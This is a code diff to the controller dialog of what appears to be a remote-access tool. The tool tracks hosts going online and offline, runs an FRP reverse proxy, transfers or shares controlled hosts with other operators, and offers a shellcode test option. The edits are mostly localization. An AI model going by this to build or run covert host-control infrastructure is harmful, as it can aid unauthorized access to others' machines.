@@ -827,7 +827,7 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
         m_CList_Online.SetItemData(i, (DWORD_PTR)ContextObject);
     }
     std::string tip = flag ? " (" + v[RES_CLIENT_PUBIP] + ") " : "";
-    ShowMessage(_TR("操作成功"), strIP + tip.c_str() + _L(_T("主机上线")) + "[" + loc + "]");
+    ShowMessage(_TR("操作成功"), strIP + tip.c_str() + " " + _L(_T("主机上线")) + "[" + loc + "]");
 
     CharMsg *title =  new CharMsg(_TR("主机上线"));
     CharMsg *text = new CharMsg(strIP + CString(tip.c_str()) + _T(" ") + _L(_T("主机上线")) + _T(" [") + loc + _T("]"));
@@ -1320,15 +1320,20 @@ DWORD WINAPI CMy2015RemoteDlg::StartFrpClient(LPVOID param)
 {
     CMy2015RemoteDlg* This = (CMy2015RemoteDlg*)param;
     IPConverter cvt;
+#ifdef _WIN64
+    int usingFRP = THIS_CFG.GetInt("frp", "UseFrp");
+#else
+    int usingFRP = 0;
+#endif
     std::string ip = THIS_CFG.GetStr("settings", "master", "");
     CString tip = !ip.empty() && ip != cvt.getPublicIP() ?
-                  CString(ip.c_str()) + " 必须是\"公网IP\"或反向代理服务器IP" :
-                  "请设置\"公网IP\"，或使用反向代理服务器的IP";
+        CString(ip.c_str()) + _L(" 必须是\"公网IP\"或反向代理服务器IP") :
+        _L("请设置\"公网IP\"，或使用反向代理服务器的IP");
+    tip += usingFRP ? _TR("[使用FRP]") : _TR("[未使用FRP]");
     CharMsg* msg = new CharMsg(tip);
     This->PostMessageA(WM_SHOWMESSAGE, (WPARAM)msg, NULL);
-    int usingFRP = 0;
 #ifdef _WIN64
-    usingFRP = ip.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
+    usingFRP = ip.empty() ? 0 : usingFRP;
 #else
     SAFE_CLOSE_HANDLE(This->m_hFRPThread);
     This->m_hFRPThread = NULL;
@@ -2892,7 +2897,7 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
         std::string aliveInfo = tm >= 86400 ? floatToString(tm / 86400.f) + " d" :
             tm >= 3600 ? floatToString(tm / 3600.f) + " h" :
             tm >= 60 ? floatToString(tm / 60.f) + " m" : floatToString(tm) + " s";
-        ShowMessage(_TR("操作成功"), ip + _TR("主机下线") + "[" + aliveInfo.c_str() + "]");
+        ShowMessage(_TR("操作成功"), ip + " " + _TR("主机下线") + "[" + aliveInfo.c_str() + "]");
         Mprintf("%s 主机下线 [%s]\n", ip, aliveInfo.c_str());
     }
     LeaveCriticalSection(&m_cs);
@@ -3187,7 +3192,7 @@ LRESULT CMy2015RemoteDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
 void CMy2015RemoteDlg::OnOnlineShare()
 {
     CInputDialog dlg(this);
-    dlg.Init("分享主机", "输入<IP:PORT>地址:");
+    dlg.Init(_TR("分享主机"), _TR("输入<IP:PORT>地址:"));
     if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
         return;
     if (dlg.m_str.GetLength() >= 250) {
@@ -3250,7 +3255,7 @@ void CMy2015RemoteDlg::OnMainProxy()
 void CMy2015RemoteDlg::OnOnlineHostnote()
 {
     CInputDialog dlg(this);
-    dlg.Init("修改备注", "请输入主机备注: ");
+    dlg.Init(_TR("修改备注"), _TR("请输入主机备注: "));
     if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty()) {
         return;
     }
@@ -3574,7 +3579,7 @@ void CMy2015RemoteDlg::OnHelpImportant()
         "本软件以“现状”提供，不附带任何保证。使用本软件的风险由用户自行承担。"
         "我们不对任何因使用本软件而引发的非法或恶意用途负责。用户应遵守相关法律"
         "法规，并负责任地使用本软件。开发者对任何因使用本软件产生的损害不承担责任。";
-    MessageBoxL(msg, "免责声明", MB_ICONINFORMATION);
+    MessageBoxL(_L(msg), "免责声明", MB_ICONINFORMATION);
 }
 
 
@@ -4011,8 +4016,8 @@ void CMy2015RemoteDlg::OnShellcodeTestAesBin()
 void CMy2015RemoteDlg::OnOnlineAssignTo()
 {
     CInputDialog dlg(this);
-    dlg.Init("转移主机(到期自动复原)", "输入<IP:PORT>地址:");
-    dlg.Init2("天数(支持浮点数):", "30");
+    dlg.Init(_TR("转移主机(到期自动复原)"), _TR("输入<IP:PORT>地址:"));
+    dlg.Init2(_TR("天数(支持浮点数):"), "30");
     if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty() || atof(dlg.m_sSecondInput.GetString())<=0)
         return;
     if (dlg.m_str.GetLength() >= 250) {
